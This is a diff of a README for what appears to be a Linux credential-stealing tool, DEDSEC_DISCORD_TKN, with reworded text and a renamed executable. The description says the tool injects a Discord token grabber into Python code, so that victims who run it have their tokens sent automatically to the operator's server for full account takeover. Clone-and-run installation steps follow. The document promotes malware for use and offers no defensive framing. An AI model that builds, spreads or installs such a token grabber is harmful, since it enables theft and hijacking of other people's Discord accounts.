@@ -2,21 +2,20 @@
 <p align="center">
 <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWNoMm4yZ3U4YmFyZXk5bWZ2ZGMycm50MGxuNGVvemQxZzRheGU1dSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/26gR0ImElLhnKb3iM/giphy.gif", width="400", height="400">
 </p>
-<h1 align="center"> DEDSEC_DISCORD_TKN</h1><h4 align="center">DISCORD_TKN is a linux based tool that can dump all discord token in application or browser.</h4>
+<h1 align="center"> DEDSEC_DISCORD_TKN</h1><h4 align="center">DISCORD_TKN is a tool designed for Linux systems that can extract all Discord tokens found within applications or browsers.</h4>
 
 ## DESCRIPTION
-DISCORD_TKN is capable of injecting token grabber to python code. When the user uses this code, their all discord token will be obtained and automatically sent to your server and you can fully take over their account and take control of it using token.
+DISCORD_TKN has the capability to inject a token grabber into Python code. When a user executes this code, all of their Discord tokens are obtained and automatically sent to your server. With these tokens, you gain full control over their account and can manipulate it as you see fit.
 
 ## INSTALLATION 
     * git clone https://github.com/0xbitx/DEDSEC_DISCORD_TKN.git
     * cd DEDSEC_DISCORD_TKNf
-    * chmod +x dedsec_discord_revl
-    * ./dedsec_discord_revl
+    * chmod +x dedsec_discord_tkn
+    * ./dedsec_discord_tkn
 ### TESTED ON FOLLOWING
 
 * Kali Linux 
 * Parrot OS 
-* Ubuntu
 
 ## Support
 
